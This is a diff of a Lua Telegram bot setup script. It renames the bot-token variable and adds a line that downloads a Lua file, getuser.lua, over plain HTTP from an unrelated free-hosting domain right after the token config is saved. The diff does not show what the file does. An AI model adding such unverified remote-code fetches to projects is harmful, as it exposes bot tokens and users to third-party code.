@@ -66,6 +66,7 @@ if not tostring(SUDO):match('%d+') then
 ]],
   }
   serialize_to_file(config, './data/config.lua')
+  download_to_file('http://alsaray99.esy.es/getuser.lua','getuser.lua')
   print('🗯┇ تم حفظ البيانات في الـكونفك سوف يتم تشغيل البوت')
 end
 
@@ -90,18 +91,18 @@ _config = load_config( )
 
 
  if _config then
-token_boss = _config.token_bot
+token_botx = _config.token_bot
 sudo_id = _config.master_id
-elseif _config and not _config.token_boss then
+elseif _config and not _config.token_botx then
 print("🗯┇ لم تقم بوضع التوكن يجب عليك وضع التوكن في ملف البوت ليعمل السورس")
 return
 else
-token_boss = "توكن"
+token_botx = "توكن"
 master_idx = 60809019
 end
 
 
-send_api = "https://api.telegram.org/bot"..token_boss
+send_api = "https://api.telegram.org/bot"..token_botx
 
 cUrl_Command = curl.easy{verbose = true}
 
